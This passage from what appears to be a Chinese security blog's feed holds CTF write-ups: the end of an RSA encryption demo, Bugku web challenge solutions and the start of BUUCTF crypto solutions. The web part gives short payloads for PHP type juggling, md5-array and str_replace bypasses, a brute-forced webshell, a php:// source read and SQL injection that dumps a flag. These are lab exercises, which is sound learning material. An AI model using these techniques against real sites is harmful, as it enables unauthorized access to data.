punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span>random_generator<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># master的秘钥对的生成</span>private_pem <span class="token operator">=</span> rsa<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span>public_pem <span class="token operator">=</span> rsa<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#生成私钥文件</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'rsa_private_key.pem'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f <span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>private_pem<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'rsa_public_key.pem'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f <span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>public_pem<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密钥对生成成功！"</span><span class="token punctuation">)</span>message <span class="token operator">=</span> <span class="token string">'hello ghost, this is a plian text'</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'rsa_public_key.pem'</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>     key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>     rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 导入读取到的公钥</span>     cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 生成对象</span>     cipher_text <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     cipher_text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 通过生成的对象加密message明文，注意，在python3中加密的数据必须是bytes类型的数据，不能是str类型的数据</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"密文为："</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>cipher_text<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'rsa_private_key.pem'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>importKey<span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 导入读取到的私钥</span>    cipher <span class="token operator">=</span> PKCS1_v1_5<span class="token punctuation">.</span>new<span class="token punctuation">(</span>rsakey<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 生成对象</span>    text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>cipher_text<span class="token punctuation">)</span>    text <span class="token operator">=</span> cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将密文解密成明文，返回的是一个bytes类型数据，需要自己转换成str</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文为："</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>text<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pt<span class="token punctuation">(</span>text<span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 将密文解密成明文，返回的是一个bytes类型数据，需要自己转换成str</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"明文为："</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>text<span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201225001731849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AES </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bugku-web</title>
      <link href="/posts/39a2a2e8.html"/>
      <url>/posts/39a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="bugku-web"><a href="#bugku-web" class="headerlink" title="bugku-web"></a>bugku-web</h1><h1 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h1><p>修改最大长度</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103131812995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><a id="more"></a>)<h1 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h1><p>要求num不能为数字并且值要等于1,payload:</p><pre><code>?num=1a</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103150506408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>在源码中发现unicode编码</p><pre><code>&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125;</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103132314218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>拿去在线加密网站解码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103132751268.png#pic_center" alt=""></p><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>添加本地域名解析</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103133012827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>访问站点</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103133058149.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h1><p>抓包一直点发送，直到找到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110313335148.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h1><p>$GLOBALS ：一个包含了全部变量的全局组合数组，它是PHP中一个超级全局变量，我们可以在PHP 程序的任何地方直接访问它</p><pre><code>args=GLOBALS</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103135209286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><p>jspfuck用控制台解码</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103135651436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h1><p>抓包查看返回包</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103140501117.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h1><p>扫目录发现一个马<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103140900906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>爆破得shell的密码为：hack<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103145649663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h1><p>查源码解密得密码，伪装ip绕过限制<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110314521537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103145323254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103145430649.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><p>将源码中的数据进行url解密，提交拼凑好的数据<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103145017544.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h1><p>用php伪协议读取index源码在解密<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103144604319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201103144743473.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h1><p>扫出一个备份文件<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104203256497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>文件内容如下</p><pre><code>&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once "flag.php";ini_set("display_errors", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2){    echo $flag."取得flag";}?&gt;</code></pre><p>str_replace可以双重编写字符串绕过<br>md5弱类型可以加数组绕过</p><pre><code>?kekeyy1[]=1&amp;kkeyey2[]=2</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104204437134.png#pic_center" alt=""></p><h1 id="成绩单"><a href="#成绩单" class="headerlink" title="成绩单"></a>成绩单</h1><p>经测试是一道sql注入题，参数加’ 报错无回显。测试可知数据库字段为4，并且有三个回显位。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104205010817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>爆数据库：skctf_flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104205208427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>爆数据表：fl4g,sc</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104205326870.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>爆字段：skctf_flag</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020110420571655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>爆内容：BUGKU{Sql_INJECT0N_4813drd8hz4}</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201104210545236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Bugku </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-crypto(1-29)</title>
      <link href="/posts/59a2a2e8.html"/>
      <url>/posts/59a2a2e8.html</url>
      
        <content type="html"><![CDATA[<h1 id="BUUCTF-crypto-1-29"><a href="#BUUCTF-crypto-1-29" class="headerlink" title="BUUCTF-crypto(1-29)"></a>BUUCTF-crypto(1-29)</h1><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110184254145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><a id="more"></a></p><h1 id="Url编码"><a href="#Url编码" class="headerlink" title="Url编码"></a>Url编码</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111018442369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="一眼就解密"><a href="#一眼就解密" class="headerlink" title="一眼就解密"></a>一眼就解密</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110184523347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="看我回旋踢"><a href="#看我回旋踢" class="headerlink" title="看我回旋踢"></a>看我回旋踢</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110184627215.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="摩丝"><a href="#摩丝" class="headerlink" title="摩丝"></a>摩丝</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110184733585.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="BJDCTF-2nd-签到-y1ng"><a href="#BJDCTF-2nd-签到-y1ng" class="headerlink" title="[BJDCTF 2nd]签到-y1ng"></a>[BJDCTF 2nd]签到-y1ng</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110184825727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="password"><a href="#password" class="headerlink" title="password"></a>password</h1><p>弱口令密码拼凑<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110185237709.png#pic_center" alt=""></p><h1 id="变异凯撒"><a href="#变异凯撒" class="headerlink" title="变异凯撒"></a>变异凯撒</h1><p>afZ_r    ascii  97  102   90   95  114</p><p>flag{     ascii  102   108   97   103   123</p><p>ascii相差规律，5 6 7 8 9<br>脚本：</p><pre><code>s = "afZ_r9VYfScOeO_UL^RWUc"re = ""a = 5for i in s :    re +=chr(ord(i)+a)    a +=1print(re)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110192300720.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="Quoted-printable"><a href="#Quoted-printable" class="headerlink" title="Quoted-printable"></a>Quoted-printable</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110192452260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="Rabbit"><a href="#Rabbit" class="headerlink" title="Rabbit"></a>Rabbit</h1><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110192945686.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="篱笆墙的影子"><a href="#篱笆墙的影子" class="headerlink" title="篱笆墙的影子"></a>篱笆墙的影子</h1><p>栅栏密码<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110193842128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h1><p>已知p,q,e求d<br>脚本附上：</p><pre><code>import gmpy2p=473398607161q=4511491e=17gmpy2.mpz(p)gmpy2.mpz(q)n = (p-1)*(q-1)d = gmpy2.invert(e,n)print(d)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110195901187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><h1 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h1><p>运行脚本即可得到flag<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110200248291.png#pic_center" alt=""></p><h1 id="BJDCTF-2nd-老文盲了"><a href="#BJDCTF-2nd-老文盲了" class="headerlink" title="[BJDCTF 2nd]老文盲了"></a>[BJDCTF 2nd]老文盲了</h1><p>奇怪的知识又增加了~<br>罼雧締眔擴灝淛匶襫黼瀬鎶軄鶛驕鳓哵眔鞹鰝</p><p>附上别的师傅的<a href="https://blog.csdn.net/MikeCoke/article/details/105903516" target="_blank" rel="noopener">wp</a>.</p><h1 id="Alice与Bob"><a href="#Alice与Bob" class="headerlink" title="Alice与Bob"></a>Alice与Bob</h1><p>基于大素数分解，解码<a href="http://www.factordb.com/" target="_blank" rel="noopener">网站</a>.<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201110201122774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/2020111020140526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDE0ODc4,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>flag{d450209323a847c8d01c6be47c81811a}</p><h1 id="rsarsa"><a href="#rsarsa" class="headerlink" title="rsarsa"></a>rsarsa</h1><p>已知p,q,e,c求m<br>脚本：</p><pre><code>import 